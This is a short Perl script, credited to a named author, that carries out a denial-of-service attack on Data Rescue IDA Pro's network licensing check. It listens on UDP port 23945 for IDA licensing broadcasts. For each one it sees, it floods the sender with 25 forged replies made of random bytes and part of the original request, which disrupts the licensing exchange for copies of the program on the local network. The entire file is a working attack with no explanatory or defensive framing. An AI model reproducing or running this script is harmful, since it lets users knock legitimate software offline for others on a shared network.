#!/usr/bin/perl -w
# Data Rescue IDA Pro licensing request DOS
# 
# Brian Caswell <bmc@shmoo.com>

use strict;
use IO::Socket::INET;

my $msg;
my $sock = new IO::Socket::INET (LocalPort => 23945, Proto => 'udp', Broadcast => 1) || die "Could not create socket: $!\n";
while ($sock->recv($msg, 40)) {
    print "GOT msg " . unpack("H*", $msg) . "\n";
    if (substr($msg, 0, 8) eq "IDA\x00\x01\x00\x00\x00") {
        print "DOSing " . $sock->peerhost() . "\n";
        for (my $i =0; $i < 25; $i++) {
            $sock->send("IDA\x00\x00\x00\x00\x00" . randtext(16) . substr($msg, 24, 16));
        }
    }
}

sub randtext {
    my ($size) = @_;
    my $c;
    while ($size--) {
        $c .= chr(int(rand(255)));
    }
    return $c;
}
